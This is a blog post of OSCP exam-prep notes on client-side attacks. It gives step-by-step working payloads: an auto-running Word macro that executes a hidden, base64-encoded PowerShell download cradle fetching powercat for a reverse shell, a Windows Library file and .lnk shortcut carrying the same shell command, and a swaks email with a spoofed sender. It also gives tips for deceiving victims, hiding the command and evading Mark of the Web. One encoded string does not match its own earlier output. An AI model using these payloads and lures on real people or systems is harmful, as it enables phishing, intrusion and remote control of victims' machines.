---
title: Client-side Attacks
date: 2024-02-11 09:45:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Client-side Attack tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Client-side Attacks

## Information Gathering

We need to, first, enumerate our target without interacting with the target machine. We will do this by analyzing metadata tags of publicly available documents, which is often not manually sanitized.

We can use Google dorking like "site:target.com filetype:pdf to locate specific filetypes of interest.

We can also use tools like gobuster with the -x param to search specific file extensions on the target.

```console
$ gobuster dir -u http://111.111.111.111/ -w '/usr/share/wordlists/dirb/common.txt' -x pdf 
```

If the target provides a PDF for download - like a brochure, menu, etc), download the file and run it through exiftool.

```console
$ exiftool -a -u brochure.pdf

...
Author                          : Jane Doe
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:04:27 07:34:01+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:04:27 07:34:01+02:00
...
```

Recent dates should give us confidence that we will be successful with attempting exploits with reported versions. 

## Client Fingerprinting

Let's acquire some information about operating systems and browsers from a target. Let's say we used theHarvester to retrieve a promising email target. We could use an HTML Application (HTA) attached to an email to run code in the context of IE and, to some extend, Microsoft Edge. This is very common.

First, confirm the target is running Windows with either IE or Edge. [Canarytokens](https://canarytokens.org/generate), the free web service, will generate a link with an embedded token that we will send to our target. When they open it, we'll receive information about their browser, IP, and OS. With this info, we can then attempt an HTA attack.

In the Canarytokens web form, select Web bug / URL, enter https://example.com as the Webhook URL, and enter Fingerprinting as the comment. Create the token, then click Manage This Token to turn on Browser Scanning. The History page will show all visitors that clicked your link.

Once you have a click, you can review the Incident List, click into an Incident, and review the location, IP address, useragent, etc.

TIP: We can use [this](https://explore.whatismybrowser.com/useragents/parse/) useragent parser for a more user-friendly result. However, the information in the Browser section of the Canary Incident will be more precise and reliable, since it comes from the JS fingerprinting code we embedded in the Canarytoken web page.

Let's also try to embed a Canarytoken in Word doc or PDF, which will give us information once our target opens the file. (Or, we could embed it into an image, which would inform us when it is viewed!)

Other options for information gathering include the [Grabify](https://grabify.link/) IP logger or [fingerprint.js](https://github.com/fingerprintjs/fingerprintjs) JS fingerprinting libraries.

## Exploiting Microsoft Office

Most cases of ransomware have had an initial breach that leveraged a malicious Microsoft Office macro! Due to this, we often will not succeed by sending malicious Office documents over email. Also, anti-phishing programs teach people to practice extreme caution when enabling macros in an Office document.

For better chances, we should use pretexts and provide a download link, or some other non-email method.

If we happen to be successful in delivering an Office document over email or download link, the file will be tagged with the Mark of the Web (MOTW) and, therefore, opened in protected view, which disables all editing settings and blocks macro/embedded object execution. If the victim enables editing, protected view will be disabled, so the easiest way to get past this is to convince the victim to Enable Editing. A common way to do this is to blur the rest of the document and instructing them to click the button to "unlock" it.

*NOTE: MOTW is not added to files on FAT32-formatted devices.
NOTE: We can avoid the MOTW flag by providing our malicious file in a 7zip, ISO, or IMG.*

It is important to note that some Microsoft Office programs, like Publisher, don't have Protected View, but we are also less likely to find them installed.

Microsoft has blocked macros by default on most versions of PowerPoint, Word, Excel, Access, and Visio since Office 2013. This removes the user's ability to click one button on the yellow warning banner to enable the content, and they must unlock the macro by checking Unblock under file properties.

### Installing Microsoft Office

*NOTE: On Windows 11, NLA is default-enabled for RDP connections, and if our target machine is not domain-joined, rdestop will not connect to it. Instead, use xfreerdp, which supported NLA for non-domain-joined machines.*

```console
$ xfreerdp /u:offsec /p:lab /v:192.168.195.196
```

### Leveraging Microsoft Word Macros

Office apps like Excel and Word allow embedded macros that are a series of commands and instructions in a group that accompish some task programatically.

*NOTE: We can write macros from scratch in Visual Basic for Applications (VBA) which has full access to ActiveX objects and the Windows Script Host, similar to JS in HTML apps.*

Let's use an embedded macro in Word for a reverse shell! 

*NOTE: Older client-side attack vectors, like Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods will work poorly without modifying our target system significantly.*

Create a blank Word doc names mymacro and save it as a .doc (97-2003). The .docx type cannot save macros without attached a containing template, which means we can run them but cannot save or embed them. We can, however, also try .docm.

Once saved, go to the View tab and click the Macros element. Name the macro MyMacro and select the MyMacro document in the Macros in drop down menu. Click Create. You'll see the MS Visual Basic for Application window. We are provided the following template:

```
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

The apostrophes start comments.

The sub prodecure is similar to a function. However, sub procedures cannot be used in expressions because they do not return any values.

Let's leverage ActiveX Objects, which provide access to underlying OS cmds. We can do this with WScript through the Windows Script Host Shell object.

```
Sub MyMacro()

    CreateObject("Wscript.Shell").Run "powershell"

End Sub
```

Office macros are not executed automatically, so we need to use the pre-defined AutoOpen macro and Document_Open event, so they will be ran upon opening the doc.

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

Click save and close the document. Re-open and observe the warning that macros were disabled. Click Enable Content. You now have a PowerShell window!

Let's take it one step further and have our macro get a reverse shell with PowerCat. We'll leverage a PowerShell download cradle (base-64 encoded) to download PowerCat and start the shell. The command must be declared as a String, which *has a 255 char limit*. However, this restriction does not apply to strings stored in variables, so we an split the commands into multiple lines and concat them.

Return to View > Macros > MyMacro > Edit. Add the Dim line.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

We will use the followimg PS command to install PoweCat and get the shell:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224/powercat.ps1');powercat -c 192.168.45.224 -p 4444 -e powershell
```

To encode for POWERSHELL, use the pwsh script from Common Web Attacks or use UTF-16LE [here](https://www.base64encode.org/).

Encoded:
```
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA
```

Use this Python script to split the encoded string into smaller chunks and concat them to Str.

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
Result:
```
$ python3 64split.py
Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
Str = Str + "ALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAY"
Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwA"
Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
Str = Str + "A"

```


Update your macro with the split strings:

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"
    Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5"
    Str = Str + "nKCdodHRwOi8vMTkyLjE2OC40NS4yMjQvcG93ZXJjYXQucHMxJ"
    Str = Str + "yk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yMjQgLXAgNDQ0NCA"
    Str = Str + "tZSBwb3dlcnNoZWxs"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Save and close the document.

Start a web server **in the directory where powercat.ps1 is**:

```console
$ python3 -m http.server 80
```

Start a nc listener.

```console
$ nc -nlvp 4444
```

Success!

## Obtaining Code Execution via Windows Library Files

Windows Library files (.Library-ms) are virtual containers for user content that connect users with remotely-stored data like that of web services or shares.

Let's try a two-datge client-side attack, where we use Windows library files to gain the foothold on the target and then provide an executable file to start a reverse shell when double-clicked.

Create a Windows library file connecting to a WebDAV share. 

```console
$ pip3 install wsgidav
$ mkdir /home/kali/webdav
$ touch /home/kali/webdav/test.txt
$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Open http://127.0.0.1 in your browser to ensure it is serving.

Now, we'll create the Windows library file.

Enter Visual Studio Code on a Windows box. (You could use Notepad)

File > New Text File > Save as "config.Library-ms" on the Desktop and enter the following XML and change the IP to your attacker IP.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.224</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Double click the new file and view the test.txt file in Windows Explorer. Also, the path only shows "config" and does not indicate it is pulling from a remote location!

If you re-open VSC, you will see a serialized tag added, which is base-64 encoded info about the location of the url tag. Content in url tags are also changed from the http://ip that we set to \\ip\DavWWWRoot in an attempt to optimize the connection info. We will need to reset the file to the above code everytime we execute the library file.

A majority of spam filters and security tech allow Windows library files through. 

Now, make the .lnk file that executes the reverse shell.

On the target user desktop, right click, Create New, and create a Shortcut. In the location field, end the reverse shell command we've used previously:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1');powercat -c 192.168.45.224 -p 4444 -e powershell"
```

TIP: To hide the command when targeting a tech-savvy user, put a delimiter and benign command behind it to push the malicious command to the hidden area in the property menu.

In the next page, name the file automatic_configuration and Finish.

On Kali, start a web server **in the dir where powercat is** and a netcat listener.

```
$ python3 -m http.server 8000

// new terminal

$ nc -nlvp 4444
```
NOTE: We could host powercat on the WebDAV share as well, but since our WebDAV share is writable, AV and other tech may remove or quarantine our payload. If we made it read-only, we'd lose a great method of transferring files from target systems. 

Double-click the shortcut file to start the reverse shell.

### Send Malicious File Over SMB

Copy automatic_configuration.lmk and config.Library-ms to our WebDAV dir on Kali. We can use the config library file to do this. (In a real assessment, we'd more likely send it over email).

Start your webserver (in same dir as powercat) and nc listener again.

```
$ python3 -m http.server 8000

// new terminal

$ nc -nlvp 4444

// new terminal, in webdav directory

$ rm test.txt
$ smbclient //192.168.243.195/share -c 'put config.Library-ms'
```

Once the user opens it, you have your reverse shell! If this doesn't work, Try Harder and combine it with an Office macro attack or something else.

If you have to send the file over email, try to use swaks! You will need the username and password of the sending account.

```console
$ swaks -t jane.doe@targetorg.com --from pwnd@targetorg.com -attach config.Library-ms --server 111.111.111.111 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
```
